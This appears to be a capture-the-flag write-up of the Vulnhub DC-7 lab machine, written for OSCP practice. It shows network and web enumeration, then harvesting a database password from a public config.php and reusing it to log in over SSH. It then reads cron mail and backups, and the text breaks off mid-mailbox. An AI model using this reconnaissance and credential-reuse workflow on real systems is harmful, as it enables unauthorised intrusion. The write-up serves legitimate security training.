---
title: Write-up DC7 on Vulnhub
author: eMVee
date: 2023-03-31 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP]
render_with_liquid: false
---
While preparing for the OSCP exam I am practicing as much as possible. Ofcourse the famous TJnull list is being used by me and I started hacking again on the DC machines. In this writeup I describe how DC7 can be hacked. The machine can be downloaded from [Vulnhub](https://www.vulnhub.com/entry/dc-7,356/). After downloading the virtual machine, you have to configure the machine so it is on the same network as your Kali machine.

## Getting started
As usual, we first create a project folder in which we store all kinds of important information.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub]
└─$ mcd DC-7
```
Now I would like to know my own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ myip    

    inet 127.0.0.1
    inet 10.0.2.15

```
Since I know my IP address it is time to identify other IP addresses in my virtual network. The first command I use is with fping.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.37
```
Another method to identify IP addresses on my network is with arp-scan. I normally use arp-scan as second method since the results could be different.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ sudo arp-scan --localnet        
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:45:23:77       PCS Systemtechnik GmbH
10.0.2.37       08:00:27:2f:6e:49       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.027 seconds (126.30 hosts/sec). 4 responded
```
There is a new IP address in my virtual network. Now let's create a variable called `ip` which has the IP address of the target assigned.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ ip=10.0.2.34
```

## Enumeration
Since everything is set we can start with a basic port scan.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ nmap -sC -p- $ip -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 06:34 CEST
Nmap scan report for 10.0.2.37
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 d002e9c75d9532ab10998984343d1ef9 (RSA)
|   256 d0d64035a734a90a7934eea96addf48f (ECDSA)
|_  256 a855d57693ed4f6ff1f7a1842fafbbe1 (ED25519)
80/tcp open  http
|_http-generator: Drupal 8 (https://www.drupal.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
|_http-title: Welcome to DC-7 | D7

Nmap done: 1 IP address (1 host up) scanned in 24.07 seconds

```
The scan was finished very fast, nmap discovered two open ports. Let's add them to our notes.
* Port 22
	* SSH
* Port 80
	* HTTP
	* Drupal 8

Based on those two ports we should start enumerating the webservice on port 80.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ whatweb http://$ip                                                       
http://10.0.2.37 [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.0.2.37], MetaGenerator[Drupal 8 (https://www.drupal.org)], PoweredBy[-block], Script, Title[Welcome to DC-7 | D7], UncommonHeaders[x-drupal-dynamic-cache,link,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge]

```
Whatweb discovered some interesting information what we should add to our notes as well.
* Linux, probably Debian
* Apache 2.4.25
* Drupal 8

Now let's see what nikto can discover on our target.
``` bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ nikto -h http://$ip 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.37
+ Target Hostname:    10.0.2.37
+ Target Port:        80
+ Start Time:         2023-03-28 06:36:52 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-drupal-dynamic-cache' found, with contents: MISS
+ Uncommon header 'x-generator' found, with contents: Drupal 8 (https://www.drupal.org)
+ Uncommon header 'x-drupal-cache' found, with contents: HIT
+ Uncommon header 'link' found, with multiple values: (<http://10.0.2.37/node/1>; rel="canonical",<http://10.0.2.37/node/1>; rel="shortlink",<http://10.0.2.37/node/1>; rel="revision",)
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Entry '/README.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/search/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry '/user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/index.php/filter/tips' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/index.php/search/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
+ Entry '/index.php/user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/index.php/user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 40 entries which should be manually viewed.
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, POST 
+ OSVDB-3092: /web.config: ASP config file is accessible.

```

Since it is a Drupal website we can use droopscan as well.
``` bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ droopescan scan drupal -u http://10.0.2.37 -t 32
[+] No plugins found.                                                           

[+] Themes found:
    startupgrowth_lite http://10.0.2.37/themes/startupgrowth_lite/
        http://10.0.2.37/themes/startupgrowth_lite/LICENSE.txt

[+] Possible version(s):
    8.7.0
    8.7.0-alpha1
    8.7.0-alpha2
    8.7.0-beta1
    8.7.0-beta2
    8.7.0-rc1
    8.7.1
    8.7.10
    8.7.11
    8.7.12
    8.7.13
    8.7.14
    8.7.2
    8.7.3
    8.7.4
    8.7.5
    8.7.6
    8.7.7
    8.7.8
    8.7.9

[+] Possible interesting urls found:
    Default admin - http://10.0.2.37/user/login

[+] Scan finished (0:05:51.235720 elapsed)


```
So there is probably a Drupal version 8.7.X running on the target. 
Let's visit the website with the web browser.
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328064115.png){: width="700" height="400" }

It looks like there a is little clue on the main page. At the bottom a twitter username is found I guess. Let's use our Google Fu to gather more information.

Based on the search query `@DC7USER` Google came back with
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328064555.png){: width="700" height="400" }


Let's visit the Github website.

![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328064723.png){: width="700" height="400" }

There is one thing available. Let's inspect this.
![Image](/assets/img/WriteUp/Vulnhub/DC7/Pasted image 20230328064942.png){: width="700" height="400" }

There is a `config.php` file available in this directory. Often this is used with some interesting settings such as usernames and passwords. Let's inspect this file.
```
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```
In this configuration file we can see an username and password. We should add them to our notes and try them on the SSH service.

## Initial access

``` bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-7]
└─$ ssh dc7user@$ip                 
The authenticity of host '10.0.2.37 (10.0.2.37)' can't be established.
ED25519 key fingerprint is SHA256:BDWqBUcitB8KKGYDyoeZkt2C/aXhZ7gi5xSEtOSB+Rk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.2.37' (ED25519) to the list of known hosts.
dc7user@10.0.2.37's password: 
Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Fri Aug 30 03:10:09 2019 from 192.168.0.100
dc7user@dc-7:~$ sudo -l
-bash: sudo: command not found
dc7user@dc-7:~$ 

```

```bash
dc7user@dc-7:~$ ls -la
total 40
drwxr-xr-x 5 dc7user dc7user 4096 Aug 30  2019 .
drwxr-xr-x 3 root    root    4096 Aug 29  2019 ..
drwxr-xr-x 2 dc7user dc7user 4096 Mar 28 23:30 backups
lrwxrwxrwx 1 dc7user dc7user    9 Aug 29  2019 .bash_history -> /dev/null
-rw-r--r-- 1 dc7user dc7user  220 Aug 29  2019 .bash_logout
-rw-r--r-- 1 dc7user dc7user 3953 Aug 29  2019 .bashrc
drwxr-xr-x 3 dc7user dc7user 4096 Aug 29  2019 .drush
drwx------ 3 dc7user dc7user 4096 Aug 29  2019 .gnupg
-rw------- 1 dc7user dc7user 7938 Aug 30  2019 mbox
-rw-r--r-- 1 dc7user dc7user  675 Aug 29  2019 .profile
```
There are few thing interesting in this home directory. There is a directory called `backups` and there is a mbox available. Let's first check the mbox.
```
dc7user@dc-7:~$ cat mbox 

From root@dc-7 Thu Aug 29 17:00:22 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:00:22 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3EPu-0000CV-5C
        for root@dc-7; Thu, 29 Aug 2019 17:00:22 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3EPu-0000CV-5C@dc-7>
Date: Thu, 29 Aug 2019 17:00:22 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 17:15:11 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:15:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3EeF-0000Dx-G1
        for root@dc-7; Thu, 29 Aug 2019 17:15:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3EeF-0000Dx-G1@dc-7>
Date: Thu, 29 Aug 2019 17:15:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 17:30:11 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:30:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3Esl-0000Ec-JQ
        for root@dc-7; Thu, 29 Aug 2019 17:30:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3Esl-0000Ec-JQ@dc-7>
Date: Thu, 29 Aug 2019 17:30:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 17:45:11 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 17:45:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3F7H-0000G3-Nb
        for root@dc-7; Thu, 29 Aug 2019 17:45:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3F7H-0000G3-Nb@dc-7>
Date: Thu, 29 Aug 2019 17:45:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 20:45:21 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 20:45:21 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3Hvd-0000ED-CP
        for root@dc-7; Thu, 29 Aug 2019 20:45:21 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3Hvd-0000ED-CP@dc-7>
Date: Thu, 29 Aug 2019 20:45:21 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]
gpg: symmetric encryption of '/home/dc7user/backups/website.tar.gz' failed: File exists
gpg: symmetric encryption of '/home/dc7user/backups/website.sql' failed: File exists

From root@dc-7 Thu Aug 29 22:45:17 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 22:45:17 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3Jng-0000Iw-Rq
        for root@dc-7; Thu, 29 Aug 2019 22:45:16 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3Jng-0000Iw-Rq@dc-7>
Date: Thu, 29 Aug 2019 22:45:16 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Thu Aug 29 23:00:12 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Thu, 29 Aug 2019 23:00:12 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3K28-0000Ll-11
        for root@dc-7; Thu, 29 Aug 2019 23:00:12 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3K28-0000Ll-11@dc-7>
Date: Thu, 29 Aug 2019 23:00:12 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Fri Aug 30 00:15:18 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Fri, 30 Aug 2019 00:15:18 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3LCo-0000Eb-02
        for root@dc-7; Fri, 30 Aug 2019 00:15:18 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3LCo-0000Eb-02@dc-7>
Date: Fri, 30 Aug 2019 00:15:18 +1000

rm: cannot remove '/home/dc7user/backups/*': No such file or directory
Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Fri Aug 30 03:15:17 2019
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1i3O0y-0000Ed-To
        for root@dc-7; Fri, 30 Aug 2019 03:15:17 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1i3O0y-0000Ed-To@dc-7>
Date: Fri, 30 Aug 2019 03:15:17 +1000

rm: cannot remove '/home/dc7user/backups/*': No such file or directory
Database dump saved to /home/dc7user/backups/website.sql               [success]

dc7user@dc-7:~$ 

```
There are a lot of emails, all about backups of a database and a bash script. We should check the backups directory.
```bash
dc7user@dc-7:~$ ls -la backups/
total 59000
drwxr-xr-x 2 dc7user dc7user     4096 Mar 28 23:30 .
drwxr-xr-x 5 dc7user dc7user     4096 Aug 30  2019 ..
-rw-r--r-- 1 dc7user dc7user 30502555 Mar 28 23:30 website.sql.gpg
-rw-r--r-- 1 dc7user dc7user 29904600 Mar 28 23:30 website.tar.gz.gpg

```
There are two files related to the website. So probably there is a backup jb for the website and the database.
The mbox did show us some emails, let's check the emails again in `/var/mail`.

```bash
dc7user@dc-7:~$ ls /var/mail/
dc7user
dc7user@dc-7:~$ cat /var/mail/dc7user 
From root@dc-7 Tue Mar 28 14:46:21 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 14:46:21 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph1Dn-0000Hx-8W
        for root@dc-7; Tue, 28 Mar 2023 14:46:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph1Dn-0000Hx-8W@dc-7>
Date: Tue, 28 Mar 2023 14:46:11 +1000

rm: cannot remove '/home/dc7user/backups/*': No such file or directory
Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 15:00:33 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 15:00:33 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph1RX-0000Ik-TU
        for root@dc-7; Tue, 28 Mar 2023 15:00:23 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph1RX-0000Ik-TU@dc-7>
Date: Tue, 28 Mar 2023 15:00:23 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 15:15:30 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 15:15:30 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph1g0-0000KO-0Y
        for root@dc-7; Tue, 28 Mar 2023 15:15:20 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph1g0-0000KO-0Y@dc-7>
Date: Tue, 28 Mar 2023 15:15:20 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 20:00:15 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 20:00:15 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph67j-0000D6-BG
        for root@dc-7; Tue, 28 Mar 2023 20:00:15 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph67j-0000D6-BG@dc-7>
Date: Tue, 28 Mar 2023 20:00:15 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 20:15:10 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 20:15:10 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph6MA-0000Ev-Kt
        for root@dc-7; Tue, 28 Mar 2023 20:15:10 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph6MA-0000Ev-Kt@dc-7>
Date: Tue, 28 Mar 2023 20:15:10 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 20:30:11 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 20:30:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph6ah-0000G3-9V
        for root@dc-7; Tue, 28 Mar 2023 20:30:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph6ah-0000G3-9V@dc-7>
Date: Tue, 28 Mar 2023 20:30:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 20:45:11 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 20:45:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph6pD-0000Hy-2C
        for root@dc-7; Tue, 28 Mar 2023 20:45:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph6pD-0000Hy-2C@dc-7>
Date: Tue, 28 Mar 2023 20:45:11 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 21:00:10 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 21:00:10 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph73i-0000Iv-D4
        for root@dc-7; Tue, 28 Mar 2023 21:00:10 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph73i-0000Iv-D4@dc-7>
Date: Tue, 28 Mar 2023 21:00:10 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 21:15:10 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 21:15:10 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph7IE-0000Ki-M9
        for root@dc-7; Tue, 28 Mar 2023 21:15:10 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph7IE-0000Ki-M9@dc-7>
Date: Tue, 28 Mar 2023 21:15:10 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 21:30:10 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 21:30:10 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph7Wk-0000Li-Qy
        for root@dc-7; Tue, 28 Mar 2023 21:30:10 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <LOGNAME=root>
Message-Id: <E1ph7Wk-0000Li-Qy@dc-7>
Date: Tue, 28 Mar 2023 21:30:10 +1000

Database dump saved to /home/dc7user/backups/website.sql               [success]

From root@dc-7 Tue Mar 28 21:45:11 2023
Return-path: <root@dc-7>
Envelope-to: root@dc-7
Delivery-date: Tue, 28 Mar 2023 21:45:11 +1000
Received: from root by dc-7 with local (Exim 4.89)
        (envelope-from <root@dc-7>)
        id 1ph7lH-0000Nd-0x
        for root@dc-7; Tue, 28 Mar 2023 21:45:11 +1000
From: root@dc-7 (Cron Daemon)
To: root@dc-7
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
